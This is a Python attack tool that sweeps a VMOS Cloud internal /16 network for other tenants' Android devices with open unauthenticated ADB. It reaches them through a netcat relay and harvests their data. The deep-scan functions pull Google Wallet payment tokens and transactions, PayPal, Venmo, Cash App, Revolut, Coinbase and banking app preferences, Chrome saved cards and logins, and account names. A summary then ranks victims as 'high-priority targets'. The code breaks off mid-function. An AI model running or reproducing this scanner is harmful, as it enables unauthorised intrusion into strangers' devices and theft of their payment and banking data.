#!/usr/bin/env python3
"""
Neighbor Device Scanner — Maps running apps, fintech/wallet targets,
payment instruments, and account data across all ADB-accessible
VMOS Cloud neighbors.

Architecture:
  Titan Host → SSH tunnel → Our Device (AC32010810392) → nc relay → Neighbor ADB

Usage:
  python3 scanning/neighbor_device_scanner.py [--deep] [--target IP]
"""

import asyncio
import subprocess
import json
import sys
import os
import time
from pathlib import Path
from dataclasses import dataclass, field, asdict

# Add project root
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
PAD = "AC32010810392"
RELAY_PORT = 15570
OUR_IP = "10.0.21.62"
ADB_DEVICE = "localhost:8550"

FINTECH_KEYWORDS = [
    "pay", "wallet", "bank", "cash", "venmo", "revolut", "wise", "chime",
    "sofi", "coinbase", "binance", "robin", "zelle", "finance", "money",
    "crypto", "gpay", "paypal", "squareup", "stripe", "klarna", "affirm",
    "gcash", "maya", "monvel", "abank", "remit", "mercado", "nubank",
    "rappi", "nequi", "daviplata", "tpaga", "yape", "plin", "nfc",
    "samsung.pay", "apple.pay", "wemade", "wemix", "metamask", "trust",
    "phantom", "uniswap", "opensea", "blockchain", "bitcoin", "ethereum",
    "token", "defi", "lending", "credit", "debit", "loan", "bnpl",
]

HIGH_VALUE_PACKAGES = [
    "com.google.android.apps.walletnfcrel",
    "com.paypal.android.p2pmobile",
    "com.venmo",
    "com.squareup.cash",
    "com.revolut.revolut",
    "com.robinhood.android",
    "com.coinbase.android",
    "com.binance.dev",
    "com.sofi.mobile",
    "com.chime.android",
    "com.zellepay.zelle",
    "com.wf.wellsfargo",
    "com.chase.sig.android",
    "com.bankofamerica.cashpro",
    "com.usaa.mobile.android.usaa",
    "com.ally.MobileBank",
    "com.discover.mobile",
    "com.capitalone.mobile",
    "com.citi.mobilebank",
    "com.bnc.android",
    "my.maya.android",
    "com.globe.gcash.android",
    "ua.monvel.bankalliance",
    "ua.com.abank",
    "com.stripe.android.paymentsheet",
    "com.klarna.android",
    "com.afterpay.android",
    "io.metamask",
    "com.wallet.crypto.trustapp",
    "app.phantom",
    "com.samsung.android.spay",
    "com.samsung.android.samsungpay.gear",
    "com.apple.android.music",  # proxy for Apple ecosystem
]

SYSTEM_PKG_PREFIXES = [
    "com.android.", "com.google.android.", "com.samsung.android.",
    "android.ext.", "android.auto_generated", "com.cloud.rtcgesture",
    "com.owlproxy.", "android.meta",
]


@dataclass
class DeviceInfo:
    ip: str
    model: str = ""
    brand: str = ""
    android_version: str = ""
    serial: str = ""
    pkg_count: int = 0
    all_apps: list = field(default_factory=list)
    third_party_apps: list = field(default_factory=list)
    fintech_apps: list = field(default_factory=list)
    high_value_apps: list = field(default_factory=list)
    payment_instruments: list = field(default_factory=list)
    accounts: list = field(default_factory=list)
    wallet_data: dict = field(default_factory=dict)
    scan_status: str = "pending"
    scan_error: str = ""
    scan_time: float = 0.0


def adb_shell(device_addr: str, command: str, timeout: int = 12) -> str:
    """Execute ADB shell command and return stdout."""
    try:
        result = subprocess.run(
            ["adb", "-s", device_addr, "shell", command],
            capture_output=True, text=True, timeout=timeout,
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return ""
    except Exception:
        return ""


def adb_pull(device_addr: str, remote: str, local: str, timeout: int = 30) -> bool:
    """Pull a file from device via ADB."""
    try:
        result = subprocess.run(
            ["adb", "-s", device_addr, "pull", remote, local],
            capture_output=True, text=True, timeout=timeout,
        )
        return result.returncode == 0
    except Exception:
        return False


async def sync_cmd(client: VMOSCloudClient, command: str, timeout: int = 20) -> str:
    """Execute root shell command on our device via Cloud API."""
    r = await client.sync_cmd(PAD, command, timeout_sec=timeout)
    if isinstance(r.get("data"), list) and r["data"]:
        return str(r["data"][0].get("errorMsg", ""))
    return ""


async def deploy_relay(client: VMOSCloudClient, target_ip: str, port: int = RELAY_PORT) -> bool:
    """Deploy nc relay on our device to forward connections to target neighbor."""
    cmd = (
        f"pkill -f 'nc -l -p {port}' 2>/dev/null; sleep 0.2; "
        f"rm -f /data/local/tmp/rf_{port}; "
        f"mkfifo /data/local/tmp/rf_{port} 2>/dev/null; "
        f"nohup sh -c 'nc -l -p {port} < /data/local/tmp/rf_{port} | "
        f"nc {target_ip} 5555 > /data/local/tmp/rf_{port}' > /dev/null 2>&1 & "
        f"echo relay_ok"
    )
    result = await sync_cmd(client, cmd, timeout=8)
    return "relay_ok" in result


async def kill_relay(client: VMOSCloudClient, port: int = RELAY_PORT):
    """Kill the nc relay."""
    await sync_cmd(client, f"pkill -f 'nc -l -p {port}' 2>/dev/null; echo done", timeout=5)


def connect_adb_relay(port: int = RELAY_PORT) -> str:
    """Set up ADB forward and connect to relay."""
    device_addr = f"localhost:{port}"
    subprocess.run(
        ["adb", "-s", ADB_DEVICE, "forward", f"tcp:{port}", f"tcp:{port}"],
        capture_output=True, timeout=5,
    )
    subprocess.run(
        ["adb", "connect", device_addr],
        capture_output=True, text=True, timeout=5,
    )
    return device_addr


def disconnect_adb_relay(port: int = RELAY_PORT):
    """Disconnect ADB relay."""
    subprocess.run(
        ["adb", "disconnect", f"localhost:{port}"],
        capture_output=True, timeout=5,
    )


def is_fintech(pkg: str) -> bool:
    """Check if package name matches fintech/payment keywords."""
    pkg_lower = pkg.lower()
    return any(kw in pkg_lower for kw in FINTECH_KEYWORDS)


def is_high_value(pkg: str) -> bool:
    """Check if package is a known high-value target."""
    return pkg in HIGH_VALUE_PACKAGES


def is_third_party(pkg: str) -> bool:
    """Check if package is third-party (not system)."""
    return not any(pkg.startswith(prefix) for prefix in SYSTEM_PKG_PREFIXES) and pkg != "android"


# ─── SCANNING FUNCTIONS ───

async def discover_open_neighbors(client: VMOSCloudClient, force_rescan: bool = False) -> list[str]:
    """Find all neighbors with non-TLS ADB across the full /16 network."""
    print("\n[DISCOVERY] Scanning full 10.0.0.0/16 for neighbors with open ADB...")

    scan_file = "/data/local/tmp/cnxn_scan_full.txt"

    # Check if a full scan is already cached
    if not force_rescan:
        cached = await sync_cmd(client, f"grep -c OPEN {scan_file} 2>/dev/null || echo 0", timeout=10)
        cached_count = int(cached.strip()) if cached.strip().isdigit() else 0
        is_complete = await sync_cmd(client, f"grep -c SCAN_COMPLETE {scan_file} 2>/dev/null || echo 0", timeout=5)
        if cached_count >= 8 and is_complete.strip() == "1":
            print(f"  Using cached full scan ({cached_count} open hosts found)")
            raw = await sync_cmd(client, f"cat {scan_file}", timeout=20)
            return _parse_scan_results(raw)

    # Build IP list: ARP-known hosts + full sweeps of known subnets
    # Subnets seen: 10.0.6.x, 10.0.16.x, 10.0.21.x (full), 10.0.37.x, 10.0.76.x, 10.0.78.x
    # Also extend to 10.0.x.x for x in 1-100 for broader discovery
    print("  Building target IP list from ARP + subnet sweep...")

    # Step 1: Get ARP-known IPs immediately (guaranteed active)
    arp_raw = await sync_cmd(client, "cat /proc/net/arp", timeout=10)
    arp_ips = []
    for line in arp_raw.split("\n")[1:]:
        parts = line.split()
        if parts and parts[0].startswith("10.0.") and parts[0] != OUR_IP:
            arp_ips.append(parts[0])
    print(f"  ARP-known live hosts: {len(arp_ips)}")

    # Step 2: Run parallel CNXN probes across ALL known subnets + ARP IPs
    # We'll launch multiple background jobs in parallel across different subnet octets
    print("  Launching parallel CNXN scan across all subnets (background)...")

    # Clear old scan file
    await sync_cmd(client, f"> {scan_file}", timeout=5)

    # First scan ARP-known IPs immediately (fast)
    arp_scan_parts = []
    for ip in arp_ips:
        arp_scan_parts.append(
            f"BYTES=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            f"\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            f"host::\\x00' | nc -w 1 {ip} 5555 2>/dev/null | wc -c); "
            f"if [ \"$BYTES\" -gt 20 ] 2>/dev/null; then "
            f"  INFO=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            f"\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            f"host::\\x00' | nc -w 2 {ip} 5555 2>/dev/null | strings | tr '\\n' '|'); "
            f"  echo \"{ip} OPEN $BYTES $INFO\" >> {scan_file}; "
            f"fi"
        )

    arp_scan_cmd = "; ".join(arp_scan_parts) + f"; echo ARP_DONE >> {scan_file}"
    await sync_cmd(client, f"nohup sh -c '{arp_scan_cmd}' > /dev/null 2>&1 &", timeout=10)

    # Wait a moment for ARP scan to start
    await asyncio.sleep(3)

    # Launch subnet sweeps as background parallel jobs
    # Scan subnets: 10.0.6, 10.0.16, 10.0.21 (full 1-254), 10.0.37, 10.0.76, 10.0.78
    # Plus broader: 10.0.1-50 (all third octets, sample .1-30 fourth octet)
    subnet_jobs = [
        # Full .21 subnet (1-254)
        (
            "for IP in $(seq 1 254); do "
            "  [ \"10.0.21.$IP\" = \"10.0.21.62\" ] && continue; "
            "  BYTES=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            "host::\\x00' | nc -w 1 10.0.21.$IP 5555 2>/dev/null | wc -c); "
            "  if [ \"$BYTES\" -gt 20 ] 2>/dev/null; then "
            "    INFO=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            f"host::\\x00' | nc -w 2 10.0.21.$IP 5555 2>/dev/null | strings | tr '\\n' '|'); "
            f"    echo \"10.0.21.$IP OPEN $BYTES $INFO\" >> {scan_file}; "
            "  fi; "
            "done"
        ),
        # Other known subnets: 10.0.6, 10.0.16, 10.0.37, 10.0.76, 10.0.78
        (
            "for SUBNET in 6 16 37 76 78; do "
            "  for IP in $(seq 1 254); do "
            "    BYTES=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            "host::\\x00' | nc -w 1 10.0.$SUBNET.$IP 5555 2>/dev/null | wc -c); "
            "    if [ \"$BYTES\" -gt 20 ] 2>/dev/null; then "
            "      INFO=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            f"host::\\x00' | nc -w 2 10.0.$SUBNET.$IP 5555 2>/dev/null | strings | tr '\\n' '|'); "
            f"      echo \"10.0.$SUBNET.$IP OPEN $BYTES $INFO\" >> {scan_file}; "
            "    fi; "
            "  done; "
            "done"
        ),
        # Broad sweep of other third-octets 1-20, 30-100 (first 30 hosts each)
        (
            "for S3 in $(seq 1 20) $(seq 30 100); do "
            "  [ $S3 -eq 6 ] && continue; [ $S3 -eq 16 ] && continue; "
            "  [ $S3 -eq 21 ] && continue; [ $S3 -eq 37 ] && continue; "
            "  [ $S3 -eq 76 ] && continue; [ $S3 -eq 78 ] && continue; "
            "  for IP in $(seq 1 30); do "
            "    BYTES=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            "host::\\x00' | nc -w 1 10.0.$S3.$IP 5555 2>/dev/null | wc -c); "
            "    if [ \"$BYTES\" -gt 20 ] 2>/dev/null; then "
            "      INFO=$(printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00"
            "\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbc\\xb1\\xa7\\xb1"
            f"host::\\x00' | nc -w 2 10.0.$S3.$IP 5555 2>/dev/null | strings | tr '\\n' '|'); "
            f"      echo \"10.0.$S3.$IP OPEN $BYTES $INFO\" >> {scan_file}; "
            "    fi; "
            "  done; "
            "done"
        ),
    ]

    # Launch all subnet jobs in parallel background
    for i, job in enumerate(subnet_jobs):
        await sync_cmd(
            client,
            f"nohup sh -c '{job}; echo JOB{i}_DONE >> {scan_file}' > /dev/null 2>&1 &",
            timeout=8
        )
        await asyncio.sleep(0.3)

    print("  Parallel scans launched. Waiting for results (polling)...")

    # Poll until all 3 jobs complete or 8 minutes pass
    for poll in range(96):
        await asyncio.sleep(5)
        done_count_raw = await sync_cmd(
            client,
            f"grep -c '_DONE\\|ARP_DONE' {scan_file} 2>/dev/null || echo 0",
            timeout=8
        )
        open_count_raw = await sync_cmd(
            client,
            f"grep -c ' OPEN ' {scan_file} 2>/dev/null || echo 0",
            timeout=8
        )
        done = int(done_count_raw.strip()) if done_count_raw.strip().isdigit() else 0
        found = int(open_count_raw.strip()) if open_count_raw.strip().isdigit() else 0
        elapsed = (poll + 1) * 5

        if elapsed % 30 == 0 or done >= 4:
            print(f"  [{elapsed}s] Jobs done: {done}/4 | Open ADB found: {found}")

        if done >= 4:
            print(f"  All scan jobs complete! Found {found} open ADB hosts.")
            break

    # Mark complete and read results
    await sync_cmd(client, f"echo SCAN_COMPLETE >> {scan_file}", timeout=5)
    raw = await sync_cmd(client, f"cat {scan_file}", timeout=30)
    return _parse_scan_results(raw)


def _parse_scan_results(raw: str) -> list[tuple]:
    """Parse CNXN scan output into (ip, model) list."""
    open_ips = []
    seen = set()
    for line in raw.split("\n"):
        if " OPEN " in line and line.strip():
            parts = line.strip().split(" ", 3)
            if len(parts) < 2:
                continue
            ip = parts[0]
            if ip == OUR_IP or ip in seen:
                continue
            if not ip.startswith("10.0."):
                continue
            seen.add(ip)
            model = ""
            if "ro.product.model=" in line:
                model = line.split("ro.product.model=")[1].split(";")[0].rstrip("|").strip()
            open_ips.append((ip, model))

    # Sort by IP
    open_ips.sort(key=lambda x: [int(p) for p in x[0].split(".")])
    print(f"  Found {len(open_ips)} neighbors with open ADB (no TLS)")
    for ip, model in open_ips:
        print(f"    {ip:18s} {model}")
    return open_ips


async def scan_device_basic(client: VMOSCloudClient, ip: str, model_hint: str = "") -> DeviceInfo:
    """Basic scan: device info + all packages."""
    dev = DeviceInfo(ip=ip)
    t0 = time.time()

    # Deploy relay
    if not await deploy_relay(client, ip):
        dev.scan_status = "relay_failed"
        dev.scan_error = "Could not deploy nc relay"
        return dev

    await asyncio.sleep(0.6)
    device_addr = connect_adb_relay()
    await asyncio.sleep(0.3)

    # Test connection
    test = adb_shell(device_addr, "echo OK", timeout=5)
    if "OK" not in test:
        dev.scan_status = "connect_failed"
        dev.scan_error = "ADB shell returned empty"
        disconnect_adb_relay()
        await kill_relay(client)
        return dev

    # Device identity
    dev.model = adb_shell(device_addr, "getprop ro.product.model", 5) or model_hint
    dev.brand = adb_shell(device_addr, "getprop ro.product.brand", 5)
    dev.android_version = adb_shell(device_addr, "getprop ro.build.version.release", 5)
    dev.serial = adb_shell(device_addr, "getprop ro.serialno", 5)

    # Package list
    raw_pkgs = adb_shell(device_addr, "pm list packages", 15)
    all_pkgs = [
        line.replace("package:", "").strip()
        for line in raw_pkgs.split("\n")
        if line.strip() and "package:" in line
    ]
    dev.all_apps = all_pkgs
    dev.pkg_count = len(all_pkgs)
    dev.third_party_apps = [p for p in all_pkgs if is_third_party(p)]
    dev.fintech_apps = [p for p in all_pkgs if is_fintech(p)]
    dev.high_value_apps = [p for p in all_pkgs if is_high_value(p)]

    dev.scan_status = "basic_done"
    dev.scan_time = time.time() - t0

    disconnect_adb_relay()
    await kill_relay(client)
    return dev


async def scan_device_deep(client: VMOSCloudClient, dev: DeviceInfo) -> DeviceInfo:
    """Deep scan: payment instruments, accounts, wallet DBs, balance info."""
    ip = dev.ip
    print(f"  [DEEP] Scanning {ip} ({dev.brand} {dev.model})...")

    if not await deploy_relay(client, ip):
        dev.scan_error += " deep_relay_failed"
        return dev

    await asyncio.sleep(0.6)
    device_addr = connect_adb_relay()
    await asyncio.sleep(0.3)

    test = adb_shell(device_addr, "echo OK", 5)
    if "OK" not in test:
        disconnect_adb_relay()
        await kill_relay(client)
        return dev

    # ── 1. Google Wallet / Pay ──
    wallet_nfcrel = "com.google.android.apps.walletnfcrel"
    if wallet_nfcrel in dev.all_apps or any("wallet" in a.lower() or "nfc" in a.lower() for a in dev.all_apps):
        wallet_info = {}

        # Check if wallet has data
        wallet_data_check = adb_shell(device_addr,
            f"ls /data/data/{wallet_nfcrel}/ 2>/dev/null || echo NO_ACCESS", 8)
        wallet_info["access"] = "no_access" if "NO_ACCESS" in wallet_data_check else "accessible"

        # Try to read COIN.xml preferences
        coin_xml = adb_shell(device_addr,
            f"cat /data/data/{wallet_nfcrel}/shared_prefs/COIN.xml 2>/dev/null | head -30", 10)
        if coin_xml:
            wallet_info["coin_xml"] = coin_xml
            # Parse payment flags
            if "has_payment_method" in coin_xml:
                wallet_info["has_payment_method"] = "true" in coin_xml.split("has_payment_method")[1][:30]
            if "default_payment_method_last4" in coin_xml:
                try:
                    last4 = coin_xml.split("default_payment_method_last4")[1].split('"')[1]
                    wallet_info["card_last4"] = last4
                except (IndexError, ValueError):
                    pass

        # Check tapandpay.db
        tapandpay = adb_shell(device_addr,
            f"sqlite3 /data/data/{wallet_nfcrel}/databases/tapandpay.db "
            f"'SELECT dpan, fpan_suffix, network, status FROM payment_instruments;' 2>/dev/null", 10)
        if tapandpay:
            wallet_info["payment_instruments_raw"] = tapandpay
            instruments = []
            for row in tapandpay.split("\n"):
                if "|" in row:
                    parts = row.split("|")
                    instruments.append({
                        "dpan": parts[0] if len(parts) > 0 else "",
                        "last4": parts[1] if len(parts) > 1 else "",
                        "network": parts[2] if len(parts) > 2 else "",
                        "status": parts[3] if len(parts) > 3 else "",
                    })
            dev.payment_instruments.extend(instruments)
            wallet_info["instruments_count"] = len(instruments)

        # Transaction log
        tx_log = adb_shell(device_addr,
            f"sqlite3 /data/data/{wallet_nfcrel}/databases/tapandpay.db "
            f"'SELECT amount, merchant, timestamp, status FROM transaction_log ORDER BY timestamp DESC LIMIT 10;' 2>/dev/null", 10)
        if tx_log:
            wallet_info["recent_transactions"] = tx_log

        dev.wallet_data["google_wallet"] = wallet_info

    # ── 2. PayPal ──
    paypal_pkg = "com.paypal.android.p2pmobile"
    if paypal_pkg in dev.all_apps:
        pp_info = {}
        pp_prefs = adb_shell(device_addr,
            f"cat /data/data/{paypal_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|account|card|last4|name' | head -20", 10)
        if pp_prefs:
            pp_info["prefs_data"] = pp_prefs
        pp_dbs = adb_shell(device_addr,
            f"ls /data/data/{paypal_pkg}/databases/ 2>/dev/null", 5)
        if pp_dbs:
            pp_info["databases"] = pp_dbs.split("\n")
        dev.wallet_data["paypal"] = pp_info

    # ── 3. Venmo ──
    venmo_pkg = "com.venmo"
    if venmo_pkg in dev.all_apps:
        venmo_info = {}
        venmo_prefs = adb_shell(device_addr,
            f"cat /data/data/{venmo_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|account|card|token' | head -20", 10)
        if venmo_prefs:
            venmo_info["prefs_data"] = venmo_prefs
        dev.wallet_data["venmo"] = venmo_info

    # ── 4. Cash App ──
    cashapp_pkg = "com.squareup.cash"
    if cashapp_pkg in dev.all_apps:
        ca_info = {}
        ca_prefs = adb_shell(device_addr,
            f"cat /data/data/{cashapp_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|cashtag|card|token|account' | head -20", 10)
        if ca_prefs:
            ca_info["prefs_data"] = ca_prefs
        dev.wallet_data["cashapp"] = ca_info

    # ── 5. Revolut ──
    revolut_pkg = "com.revolut.revolut"
    if revolut_pkg in dev.all_apps:
        rv_info = {}
        rv_prefs = adb_shell(device_addr,
            f"cat /data/data/{revolut_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|account|card|token|currency' | head -20", 10)
        if rv_prefs:
            rv_info["prefs_data"] = rv_prefs
        dev.wallet_data["revolut"] = rv_info

    # ── 6. Coinbase ──
    coinbase_pkg = "com.coinbase.android"
    if coinbase_pkg in dev.all_apps:
        cb_info = {}
        cb_prefs = adb_shell(device_addr,
            f"cat /data/data/{coinbase_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|wallet|address|token' | head -20", 10)
        if cb_prefs:
            cb_info["prefs_data"] = cb_prefs
        dev.wallet_data["coinbase"] = cb_info

    # ── 7. Maya (Philippines) ──
    maya_pkg = "my.maya.android"
    if maya_pkg in dev.all_apps:
        maya_info = {}
        maya_prefs = adb_shell(device_addr,
            f"cat /data/data/{maya_pkg}/shared_prefs/*.xml 2>/dev/null | "
            f"grep -iE 'email|user|balance|account|card|token|phone|name' | head -20", 10)
        if maya_prefs:
            maya_info["prefs_data"] = maya_prefs
        maya_dbs = adb_shell(device_addr,
            f"ls /data/data/{maya_pkg}/databases/ 2>/dev/null", 5)
        if maya_dbs:
            maya_info["databases"] = maya_dbs.split("\n")
        dev.wallet_data["maya"] = maya_info

    # ── 8. Generic bank apps ──
    bank_keywords = ["bank", "abank", "monvel", "chase", "wells", "capital", "citi"]
    for pkg in dev.all_apps:
        if any(kw in pkg.lower() for kw in bank_keywords) and pkg not in [wallet_nfcrel]:
            bank_info = {}
            bank_prefs = adb_shell(device_addr,
                f"cat /data/data/{pkg}/shared_prefs/*.xml 2>/dev/null | "
                f"grep -iE 'email|user|balance|account|card|token|name|phone' | head -15", 10)
            if bank_prefs:
                bank_info["prefs_data"] = bank_prefs
            bank_dbs = adb_shell(device_addr,
                f"ls /data/data/{pkg}/databases/ 2>/dev/null", 5)
            if bank_dbs:
                bank_info["databases"] = bank_dbs.split("\n")
            if bank_info:
                dev.wallet_data[pkg] = bank_info

    # ── 9. Chrome autofill / saved cards ──
    chrome_pkg = "com.android.chrome"
    if chrome_pkg in dev.all_apps:
        chrome_info = {}
        # Check for Web Data (saved payment methods)
        chrome_webdata = adb_shell(device_addr,
            f"sqlite3 '/data/data/{chrome_pkg}/app_chrome/Default/Web Data' "
            f"'SELECT name_on_card, card_number_encrypted, expiration_month, "
            f"expiration_year FROM credit_cards;' 2>/dev/null", 10)
        if chrome_webdata:
            chrome_info["saved_cards_raw"] = chrome_webdata
            cards = []
            for row in chrome_webdata.split("\n"):
                if "|" in row:
                    parts = row.split("|")
                    cards.append({
                        "name": parts[0] if len(parts) > 0 else "",
                        "number_enc": parts[1][:20] + "..." if len(parts) > 1 else "",
                        "exp_month": parts[2] if len(parts) > 2 else "",
                        "exp_year": parts[3] if len(parts) > 3 else "",
                    })
            chrome_info["cards_count"] = len(cards)
            dev.payment_instruments.extend([{"source": "chrome", **c} for c in cards])

        # Saved logins 
        chrome_logins = adb_shell(device_addr,
            f"sqlite3 '/data/data/{chrome_pkg}/app_chrome/Default/Login Data' "
            f"'SELECT origin_url, username_value FROM logins LIMIT 20;' 2>/dev/null", 10)
        if chrome_logins:
            chrome_info["saved_logins"] = chrome_logins

        dev.wallet_data["chrome"] = chrome_info

    # ── 10. Accounts on device ──
    accounts_raw = adb_shell(device_addr,
        "dumpsys account 2>/dev/null | grep -E 'Account {|type=' | head -30", 10)
    if accounts_raw:
        accounts = []
        for line in accounts_raw.split("\n"):
            line = line.strip()
            if "Account {" in line:
                # Parse "Account {name=xxx, type=yyy}"
                try:
                    name = line.split("name=")[1].split(",")[0]
                    atype = line.split("type=")[1].rstrip("}")
                    accounts.append({"name": name, "type": atype})
                except (IndexError, ValueError):
                    accounts.append({"raw": line})
        dev.accounts = accounts

    # ── 11. Running services (detect active payment/banking) ──
    running = adb_shell(device_addr,
        "dumpsys activity services 2>/dev/null | grep -iE 'ServiceRecord.*pay|wallet|bank|cash|venmo|revolut|coinbase' | head -10", 10)
    if running:
        dev.wallet_data["running_payment_services"] = running

    dev.scan_status = "deep_done"
    dev.scan_time = time.time() - (time.time() - dev.scan_time) if dev.scan_time else 0

    disconnect_adb_relay()
    await kill_relay(client)
    return dev


def print_device_report(dev: DeviceInfo, verbose: bool = False):
    """Print formatted report for a single device."""
    hv = "★★★ HIGH VALUE" if dev.high_value_apps or dev.payment_instruments else ""
    fin = "★★ FINTECH" if dev.fintech_apps and not hv else ""
    tag = hv or fin or ""

    print(f"\n{'━'*70}")
    print(f"  {dev.ip:18s} │ {dev.brand} {dev.model} │ Android {dev.android_version} {tag}")
    print(f"  Serial: {dev.serial} │ Packages: {dev.pkg_count} │ Status: {dev.scan_status}")
    print(f"{'━'*70}")

    if dev.third_party_apps:
        print(f"  Third-party apps ({len(dev.third_party_apps)}):")
        for app in dev.third_party_apps:
            marker = " ★" if is_fintech(app) else ""
            marker += " ♦" if is_high_value(app) else ""
            print(f"    • {app}{marker}")

    if dev.fintech_apps:
        print(f"\n  Fintech/Payment apps ({len(dev.fintech_apps)}):")
        for app in dev.fintech_apps:
            print(f"    💰 {app}")

    if dev.payment_instruments:
        print(f"\n  Payment Instruments ({len(dev.payment_instruments)}):")
        for inst in dev.payment_instruments:
            if "dpan" in inst:
                print(f"    💳 DPAN: {inst['dpan'][:8]}... │ Last4: {inst.get('last4','')} │ Network: {inst.get('network','')} │ Status: {inst.get('status','')}")
            elif "name" in inst:
                print(f"    💳 {inst.get('source','')}: {inst['name']} │ Exp: {inst.get('exp_month','')}/{inst.get('exp_year','')}")

    if dev.accounts:
        print(f"\n  Device Accounts ({len(dev.accounts)}):")
        for acc in dev.accounts:
            if "name" in acc:
                print(f"    👤 {acc['name']} ({acc.get('type','')})")
            else:
                print(f"    👤 {acc.get('raw','')}")

    if dev.wallet_data:
        print(f"\n  Wallet Data Sources ({len(dev.wallet_data)}):")
        for wallet_name, data in dev.wallet_data.items():
            details = []
            if isinstance(data, dict):
                if "instruments_count" in data:
                    details.append(f"{data['instruments_count']} instruments")
                if "cards_count" in data:
                    details.append(f"{data['cards_count']} cards")
                if "card_last4" in data:
                    details.append(f"card ****{data['card_last4']}")
                if "databases" in data:
                    details.append(f"{len(data['databases'])} DBs")
                if "prefs_data" in data:
                    details.append("prefs extracted")
                if "saved_logins" in data:
                    details.append("logins found")
            detail_str = " │ ".join(details) if details else "scanned"
            print(f"    🔑 {wallet_name}: {detail_str}")

    if verbose and dev.wallet_data:
        print(f"\n  Raw wallet data:")
        for k, v in dev.wallet_data.items():
            print(f"    [{k}]: {json.dumps(v, indent=6, default=str)[:500]}")


def print_summary(results: list[DeviceInfo]):
    """Print summary across all scanned devices."""
    print(f"\n{'═'*70}")
    print(f"  NEIGHBOR DEVICE SCAN SUMMARY")
    print(f"{'═'*70}")

    total = len(results)
    scanned = [r for r in results if "done" in r.scan_status]
    failed = [r for r in results if "failed" in r.scan_status]
    with_apps = [r for r in scanned if r.third_party_apps]
    with_fintech = [r for r in scanned if r.fintech_apps]
    with_hv = [r for r in scanned if r.high_value_apps]
    with_instruments = [r for r in scanned if r.payment_instruments]
    with_accounts = [r for r in scanned if r.accounts]

    print(f"  Total targets:        {total}")
    print(f"  Successfully scanned: {len(scanned)}")
    print(f"  Failed:               {len(failed)}")
    print(f"  With third-party apps:{len(with_apps)}")
    print(f"  With fintech apps:    {len(with_fintech)}")
    print(f"  With HIGH VALUE apps: {len(with_hv)}")
    print(f"  With payment cards:   {len(with_instruments)}")
    print(f"  With device accounts: {len(with_accounts)}")

    if with_fintech:
        print(f"\n  ─── HIGH-PRIORITY TARGETS ───")
        for r in with_fintech:
            apps_str = ", ".join(r.fintech_apps[:5])
            print(f"    {r.ip:18s} │ {r.brand} {r.model:15s} │ {apps_str}")

    if with_instruments:
        print(f"\n  ─── PAYMENT INSTRUMENTS FOUND ───")
        for r in with_instruments:
            for inst in r.payment_instruments:
                src = inst.get("source", "wallet")
                last4 = inst.get("last4", inst.get("name", ""))
                print(f"    {r.ip:18s} │ {src}: {last4}")

    # All unique fintech app packages across all devices
    all_fintech = set()
    for r in scanned:
        all_fintech.update(r.fintech_apps)
    if all_fintech:
        print(f"\n  ─── ALL FINTECH PACKAGES DISCOVERED ───")
        for pkg in sorted(all_fintech):
            print(f"    • {pkg}")


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Neighbor Device Scanner")
    parser.add_argument("--deep", action="store_true", help="Enable deep scanning for payment data")
    parser.add_argument("--target", type=str, help="Scan specific IP only")
    parser.add_argument("--output", type=str, default="/tmp/neighbor_scan_report.json")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--force-rescan", action="store_true", help="Force fresh /16 network scan even if cached")
    args = parser.parse_args()

    client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")

    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  VMOS CLOUD NEIGHBOR DEVICE SCANNER  (full /16 sweep)      ║")
    print("║  Maps apps, fintech/wallets, payment instruments, accounts ║")
    print("╚══════════════════════════════════════════════════════════════╝")

    if args.target:
        targets = [(args.target, "")]
    else:
        targets = await discover_open_neighbors(client, force_rescan=args.force_rescan)

    if not targets:
        print("\n[!] No open neighbors found. Exiting.")
        return

    results = []
    for i, (ip, model_hint) in enumerate(targets):
        print(f"\n[{i+1}/{len(targets)}] Basic scan: {ip} ({model_hint or 'unknown'})...")
        dev = await scan_device_basic(client, ip, model_hint)

        if "done" in dev.scan_status:
            print(f"  ✓ {dev.brand} {dev.model} │ {dev.pkg_count} pkgs │ "
                  f"{len(dev.third_party_apps)} 3rd-party │ {len(dev.fintech_apps)} fintech")

            # Deep scan if enabled and device has interesting apps
            if args.deep and (dev.fintech_apps or dev.high_value_apps or args.target):
                dev = await scan_device_deep(client, dev)
        else:
